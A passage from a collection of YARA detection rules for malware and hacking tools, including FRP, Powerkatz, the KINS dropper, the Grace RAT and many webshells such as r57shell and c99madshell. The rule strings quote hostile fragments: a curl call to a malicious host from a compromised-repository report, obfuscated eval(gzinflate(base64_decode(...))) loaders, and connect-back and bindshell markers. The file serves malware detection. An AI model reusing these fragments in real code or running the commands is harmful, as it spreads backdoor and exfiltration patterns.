		$a1 = "tbrains.buildServer.ACTIVITIES"
		$s1 = "External process is launched by user user with id"
		$s2 = ". Command line: cmd.exe \"/c whoami"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_FRP_Apr20_1
{
	meta:
		description = "Detects FRP fast reverse proxy tool often used by threat groups"
		author = "Florian Roth (Nextron Systems)"
		id = "55483832-0e0b-5c28-8be5-dbd14ddb50e3"
		date = "2020-04-07"
		modified = "2022-11-03"
		reference = "https://github.com/fatedier/frp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_frp_proxy.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "21f91fd99aed8b62d804504889c41ca77567fd345cf4ea0ef00161eefa9324a7"
		score = 70
		quality = 85
		tags = ""
		hash1 = "05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006"
		hash2 = "08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d"

	strings:
		$x1 = "frp/vendor/github.com/spf13/" ascii
		$x2 = "github.com/fatedier/frp/vendor/" ascii
		$fpg2 = "<html"
		$fpg3 = "<HTML"
		$fpg6 = "<?xml"

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_HKTL_Powerkatz_Feb19_1
{
	meta:
		description = "Detetcs a tool used in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "294d6f6c-dbc8-5431-87a0-64abe582c4ea"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_aus_parl_compromise.yar#L137-L152"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d1d39d68c5c5a3f6142a966925e2a136e937bc09abddd4080862346683886455"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Powerkatz32" ascii wide fullword
		$x2 = "Powerkatz64" ascii wide
		$s1 = "GetData: not found taskName" fullword ascii wide
		$s2 = "GetRes Ex:" fullword ascii wide

	condition:
		1 of ( $x* ) and 1 of ( $s* )
}

rule SIGNATURE_BASE_MAL_Github_Repo_Compromise_Myjino_Ru_Aug22
{
	meta:
		description = "Detects URL mentioned in report on compromised Github repositories in August 2022"
		author = "Florian Roth (Nextron Systems)"
		id = "1eaabad5-d0de-5d17-a5fa-3c638354843d"
		date = "2022-08-03"
		modified = "2023-12-05"
		reference = "https://twitter.com/stephenlacy/status/1554697077430505473"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_github_repo_compromise_myjino_ru.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "5cbe6ee46a68d89b1e772762e29baa907458235cd014f20a0d0932e95c046f19"
		score = 90
		quality = 85
		tags = ""

	strings:
		$x1 = "curl http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide
		$x2 = "http__.Post(\"http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_MAL_JS_Efile_Apr23_1
{
	meta:
		description = "Detects JavaScript malware used in eFile compromise"
		author = "Florian Roth"
		id = "ba7a8b2c-789c-5bc5-be53-f2b92c7039e1"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/Ax_Sharma/status/1643178696084271104/photo/1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_efile_apr23.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6d94162e5719b92d9df349e7d48cd70e218998b0e120870a435a8073fa49c532"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "let payload_chrome = "
		$s2 = "else if (agent.indexOf(\"firefox"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHP_Efile_Apr23_1
{
	meta:
		description = "Detects malware "
		author = "Florian Roth"
		id = "d663b38e-b082-5cf7-9853-f4685bf3a87b"
		date = "2023-04-06"
		modified = "2023-12-05"
		reference = "https://twitter.com/malwrhunterteam/status/1642988428080865281?s=12&t=C0_T_re0wRP_NfKa27Xw9w"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_efile_apr23.yar#L18-L32"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ec4ac3f5c19f506a70eacb5fe3173cc06bf20567bbc9a96f3b269910382e5fa2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "mt_rand( 0, 0xffff ), mt_rand( 0, 0xffff )" ascii
		$s2 = "C:\\\\ProgramData\\\\Browsers" ascii fullword
		$s3 = "curl_https($api_url." ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_KINS_Dropper
{
	meta:
		description = "Match protocol, process injects and windows exploit present in KINS dropper"
		author = "AlienVault Labs aortega@alienvault.com"
		id = "17e12685-aaad-5d83-949c-43d5aef1ef0d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/arPhm3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/crime_kins_dropper.yar#L1-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "cdab93f823e13e0c3104de8e05cb1572f83fb5294f359698092d73fc7983955b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$n1 = "tid=%d&ta=%s-%x" fullword
		$n2 = "fid=%d" fullword
		$n3 = "%[^.].%[^(](%[^)])" fullword
		$i0 = "%s [%s %d] 77 %s"
		$i01 = "Global\\%s%x"
		$i1 = "Inject::InjectProcessByName()"
		$i2 = "Inject::CopyImageToProcess()"
		$i3 = "Inject::InjectProcess()"
		$i4 = "Inject::InjectImageToProcess()"
		$i5 = "Drop::InjectStartThread()"
		$uac1 = "ExploitMS10_092"
		$uac2 = "\\globalroot\\systemroot\\system32\\tasks\\" ascii wide
		$uac3 = "<RunLevel>HighestAvailable</RunLevel>" ascii wide

	condition:
		2 of ( $n* ) and 2 of ( $i* ) and 2 of ( $uac* )
}

rule SIGNATURE_BASE_MAL_Grace_Dec22
{
	meta:
		description = "Detects Grace (aka FlawedGrace and GraceWire) RAT"
		author = "X__Junior"
		id = "fc2214dc-f1e5-52d7-a9de-88709a03b04e"
		date = "2022-12-13"
		modified = "2023-12-05"
		reference = "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_sysaid_cve_2023_47246.yar#L40-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8276662dadfa2f8e07dd7882a60e55bd22ecf1f8f66a09940f16236598646560"
		score = 70
		quality = 85
		tags = ""
		hash1 = "a66df3454b8c13f1b92d8b2cf74f5bfcdedfbff41a5e4add62e15277d14dd169"
		hash2 = "e113a8df3c4845365f924bacf10c00bcc5e17587a204b640852dafca6db20404"

	strings:
		$sa1 = "Grace finalized, no more library calls allowed." ascii
		$sa2 = "Socket forcibly closed due to no response to DISCONNECT signal from other side, worker id(%d)" ascii
		$sa3 = "AVWireCleanupThread" ascii
		$sa4 = "AVTunnelClientDirectIO" ascii
		$sa5 = "AVGraceTunnelWriteThread" ascii
		$sa6 = "AVGraceTunnelClientDirectIO" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_Perlbot_Pl
{
	meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "378cb0e4-2069-50b7-ab3e-5a81055e9983"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3635-L3646"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
		logic_hash = "784980d620e71fb0cf5aed9ef8bd171a8f50d850bc782645575070b75c42e426"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Backdoor_Php
{
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aca53071-f793-538d-bbeb-34469cdb4d1f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3647-L3659"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		logic_hash = "acab82b40760b45d49da51953f78c69166955de54918634c9bfe394208cdbb56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_Php
{
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e91114ce-18f9-51cd-b41c-b796960ea4fe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3660-L3672"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		logic_hash = "a0606dad4474579354709fe6306d15427afc4dec8ad6760a0ee9e91c86c23e4d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Nshell__1__Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44e8b6c5-6f41-5c37-a083-26acedd91956"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3673-L3684"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "973fc89694097a41e684b43a21b1b099"
		logic_hash = "53c7cd24c4eddbded1b4c16fd2758bdf66c0bbe396e487a56d56fc053cf3cc1a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shankar_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0c8ab3eb-574b-5e5a-8117-4efecef94f83"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3685-L3697"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
		logic_hash = "58b365206c18b8394cf1e03b71b8e47be10bc933bc2c05b7b03b7dad94f6d6b8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"

	condition:
		1 of ( $s* ) and $sAuthor
}

rule SIGNATURE_BASE_Casus15_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ba6748a2-fb80-5eda-816c-155bab9285e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3698-L3710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
		logic_hash = "6ee7a07163d33ca329d3be2084406629711db14db4605e8413ee963eb0f9d5a7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Small_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cf4fb88f-a312-560d-be0b-b55bfcb889be"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3711-L3723"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
		logic_hash = "e0444aa604e8956d423037b70b9476f5653503055d0f1bc875d43de144ce5c44"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Shellbot_Pl
{
	meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "07c145b1-c9f7-564a-b354-a6d2072f380c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3724-L3738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
		logic_hash = "5db224e4fe8608bb53f044ca6c0361dc66cadd58c6d4ea5ab4f8ae14ebde0e6e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
		$s2 = "CoRpOrAtIoN"
		$s3 = "# Servidor de irc que vai ser usado "
		$s4 = "/^ctcpflood\\s+(\\d+)\\s+(\\S+)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Ngh_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file ngh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "2d8ff3c1-d6b3-57ce-8213-232b376dbd05"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3753-L3767"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c372b725419cdfd3f8a6371cfeebc2fd"
		logic_hash = "c794b216bafdaecf5bd138cc8c7552efbb8c3c571a441489d02a19793a4c294f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Cr4sh_aka_RKL"
		$s1 = "NGH edition"
		$s2 = "/* connectback-backdoor on perl"
		$s3 = "<form action=<?=$script?>?act=bindshell method=POST>"
		$s4 = "$logo = \"R0lGODlhMAAwAOYAAAAAAP////r"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Jsp_Reverse_Jsp
{
	meta:
		description = "Semi-Auto-generated  - file jsp-reverse.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4953b230-4cd9-55d6-a3cb-8d3713e7fb0c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3768-L3780"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8b0e6779f25a17f0ffb3df14122ba594"
		logic_hash = "bdd2db4c032b25faaaf3a3a8e769000013f643ecfcb8b0374165a244ad2162a6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "// backdoor.jsp"
		$s1 = "JSP Backdoor Reverse Shell"
		$s2 = "http://michaeldaw.org"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Tool_Asp
{
	meta:
		description = "Semi-Auto-generated  - file Tool.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e5e727bd-836b-5540-8755-40f37904bc03"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3781-L3794"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8febea6ca6051ae5e2ad4c78f4b9c1f2"
		logic_hash = "d6bd782302b2c614fc572babb3825c0e1fcd0de5841ca8541ca27580ccc274d4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "mailto:rhfactor@antisocial.com"
		$s2 = "?raiz=root"
		$s3 = "DIGO CORROMPIDO<BR>CORRUPT CODE"
		$s4 = "key = \"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0"

	condition:
		2 of them
}

rule SIGNATURE_BASE_NT_Addy_Asp
{
	meta:
		description = "Semi-Auto-generated  - file NT Addy.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "18f5f360-8690-5e09-ac18-b8cc4f678811"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3795-L3807"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2e0d1bae844c9a8e6e351297d77a1fec"
		logic_hash = "0fc61d5e276786b8be822712cdcfc81146998e535532e44d3da92e0668713a48"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "NTDaddy v1.9 by obzerve of fux0r inc"
		$s2 = "<ERROR: THIS IS NOT A TEXT FILE>"
		$s4 = "RAW D.O.S. COMMAND INTERFACE"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Simattacker___Vrsion_1_0_0___Priv8_4_My_Friend_Php
{
	meta:
		description = "Semi-Auto-generated  - file SimAttacker - Vrsion 1.0.0 - priv8 4 My friend.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a34f4fd-337d-5eb4-b7b7-4adb1c2b7937"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3808-L3820"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "089ff24d978aeff2b4b2869f0c7d38a3"
		logic_hash = "46bc4063d06b4af3e4e61e1e998d489e974e76f17363c9777b8afc39ff21f698"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SimAttacker - Vrsion : 1.0.0 - priv8 4 My friend"
		$s3 = " fputs ($fp ,\"\\n*********************************************\\nWelcome T0 Sim"
		$s4 = "echo \"<a target='_blank' href='?id=fm&fedit=$dir$file'><span style='text-decora"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Remexp_Asp
{
	meta:
		description = "Semi-Auto-generated  - file RemExp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "900036ce-ff13-5441-bb77-906ea08a4ca0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3821-L3833"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aa1d8491f4e2894dbdb91eec1abc2244"
		logic_hash = "c7da9908a0252e95b47dbc8fbb36aeac1661dc464123aaca036bd51047a31584"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<title>Remote Explorer</title>"
		$s3 = " FSO.CopyFile Request.QueryString(\"FolderPath\") & Request.QueryString(\"CopyFi"
		$s4 = "<td bgcolor=\"<%=BgColor%>\" title=\"<%=File.Name%>\"> <a href= \"showcode.asp?f"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phvayvv_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file phvayvv.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "76351a59-8f52-5110-a9b8-36edd59026df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3834-L3846"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "35fb37f3c806718545d97c6559abd262"
		logic_hash = "503a69a7e2c30cc82eba430082627bb93c459a95f675b968126bf4524c598863"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "{mkdir(\"$dizin/$duzenx2\",777)"
		$s1 = "$baglan=fopen($duzkaydet,'w');"
		$s2 = "PHVayv 1.0"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Klasvayv_Asp
{
	meta:
		description = "Semi-Auto-generated  - file klasvayv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "3ca4c20c-f879-55a0-9070-d40fc903f9ae"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3847-L3860"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2b3e64bf8462fc3d008a3d1012da64ef"
		logic_hash = "eb1b11e02b075a4e7d28b77cf91ad596a85e4c697a36304ee177d46735965e75"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "set aktifklas=request.querystring(\"aktifklas\")"
		$s2 = "action=\"klasvayv.asp?klasorac=1&aktifklas=<%=aktifklas%>&klas=<%=aktifklas%>"
		$s3 = "<font color=\"#858585\">www.aventgrup.net"
		$s4 = "style=\"BACKGROUND-COLOR: #95B4CC; BORDER-BOTTOM: #000000 1px inset; BORDER-LEFT"

	condition:
		1 of them
}

rule SIGNATURE_BASE_R57Shell_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file r57shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "1f1070e8-e82c-5cae-a64a-cd5028adae97"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3861-L3874"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d28445de424594a5f14d0fe2a7c4e94f"
		logic_hash = "658eec4f3c463ec1a480bcb7ba995b8d81d1fb846832e569751d9f505f0fa87e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " else if ($HTTP_POST_VARS['with'] == \"lynx\") { $HTTP_POST_VARS['cmd']= \"lynx "
		$s2 = "RusH security team"
		$s3 = "'ru_text12' => 'back-connect"
		$s4 = "<title>r57shell</title>"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Rst_Sql_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file rst_sql.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "41730336-0dce-5ed9-95b0-c911a4e3cb48"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3875-L3888"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0961641a4ab2b8cb4d2beca593a92010"
		logic_hash = "d15cf69d9ad8683d2ac1ff09b08b0b26ecaf35df8e45bbd5c3a02c393f88cb34"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "C:\\tmp\\dump_"
		$s1 = "RST MySQL"
		$s2 = "http://rst.void.ru"
		$s3 = "$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Wh_Bindshell_Py
{
	meta:
		description = "Semi-Auto-generated  - file wh_bindshell.py.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b7acbfe7-fd28-5832-9af2-1c5befe4bbab"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3889-L3901"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fab20902862736e24aaae275af5e049c"
		logic_hash = "e38a4f5c23371705f9bbf2db8e65d68074554edc1022576166e76d40e06bc039"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#Use: python wh_bindshell.py [port] [password]"
		$s2 = "python -c\"import md5;x=md5.new('you_password');print x.hexdigest()\"" fullword
		$s3 = "#bugz: ctrl+c etc =script stoped=" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_C99Madshell_V2_0_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file c99madshell_v2.0.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b0724920-dc1e-5819-a99b-618a9a7e1eca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3915-L3925"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d27292895da9afa5b60b9d3014f39294"
		logic_hash = "07922511d9dfdd32f6b1f47479fca2063b773024a20dcab6f5cf4d56d66c3397"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef"

	condition:
		all of them
}

rule SIGNATURE_BASE_Uploader_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file uploader.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
